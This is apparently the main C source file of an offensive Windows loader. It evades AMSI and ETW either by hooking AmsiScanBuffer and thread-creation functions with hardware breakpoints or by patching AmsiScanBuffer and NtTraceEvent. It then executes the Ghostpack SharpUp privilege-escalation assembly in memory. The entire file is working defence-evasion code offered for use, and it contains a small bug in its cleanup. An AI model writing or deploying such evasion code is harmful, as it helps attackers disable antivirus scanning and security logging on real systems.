#include <stdio.h>
#include <stdlib.h>

#include "Prototypes.h"

int main()
{

#ifdef HWBP
	printf("[!] Evade Amsi/Etw with HWBP Hooking\n");
#elif PATCH
	printf("[!] Evade Amsi/Etw with function patching\n");
#elif _DEBUG
	printf("[!] No ! Debug with printf/getchar\n");
	return 0;
#endif

	BYTE assemblyPath[] = "C:\\Tools\\Ghostpack-CompiledBinaries\\SharpUp.exe";
	WCHAR args[] = L"audit";

	printf("[*] Assembly path : %s\n\n", assemblyPath);

	void* pAssemblyContent = NULL;
	DWORD dwAssemblySize = 0;

	if (!
		ReadFileFromDisk(&assemblyPath, &pAssemblyContent, &dwAssemblySize)
		)
	{
		printf("Can't read file from disk !\n");
		return 1;
	}

	HMODULE hModAmsi	= LoadLibraryA("amsi.dll");
	HMODULE hModNtdll	= LoadLibraryA("Ntdll.dll");

	if (!hModAmsi || !hModNtdll)
		return EXCEPTION_CONTINUE_SEARCH;

#ifdef HWBP

	HANDLE hThread = GetCurrentThread();

	DWORD64	dwAmsiScanBuffer			= GetProcAddress(hModAmsi,	"AmsiScanBuffer");
	DWORD64 dwNtCreateThreadEx			= GetProcAddress(hModNtdll, "NtCreateThreadEx");
	DWORD64 dwNtCreateWorkerFactory		= GetProcAddress(hModNtdll, "NtCreateWorkerFactory");
	DWORD64 dwRtlQueueWorkItem			= GetProcAddress(hModNtdll, "RtlQueueWorkItem");

	if (
		!dwAmsiScanBuffer			||
		!dwNtCreateThreadEx			||
		!dwNtCreateWorkerFactory	||
		!dwRtlQueueWorkItem
		)
		return EXCEPTION_CONTINUE_SEARCH;


	if (AddVectoredExceptionHandler(1, &HookHandler) == NULL)
	{
		printf("[!] Can't set VEH Handler ! ERROR : %d\n", GetLastError());
		return 0;
	}


	if (!SetHwbp(hThread, dwAmsiScanBuffer, dwNtCreateWorkerFactory, dwRtlQueueWorkItem, dwNtCreateThreadEx))
	{
		printf("[!] Error to set HWBP !\n");
		return 0;
	}
#elif PATCH
	
	PVOID	pAmsiScanBuffer		= GetProcAddress(hModAmsi,	"AmsiScanBuffer");
	PVOID	pNtTraceEvent		= GetProcAddress(hModNtdll, "NtTraceEvent");
	if (!PatchFunction(pAmsiScanBuffer, FALSE))
	{
		printf("[!] Can't patch AmsiScanBuffer !\n");
		return 0;
	}

	if (!PatchFunction(pNtTraceEvent, TRUE))
	{
		printf("[!] Can't patch AmsiScanBuffer !\n");
		return 0;
	}

	printf("[!] AmsiScanBuffer & NtTraceEvent patched with success !\n");

#endif
	if (executeAssembly(pAssemblyContent, dwAssemblySize, (LPSTR)&args))
	{
		printf("[!!] Assembly run with success !\n");
		return 1;
	}
	else
	{
		printf("Error during the exeuction of assembly\n");
	}


	if (!pAssemblyContent) free(pAssemblyContent);


	return 0;
}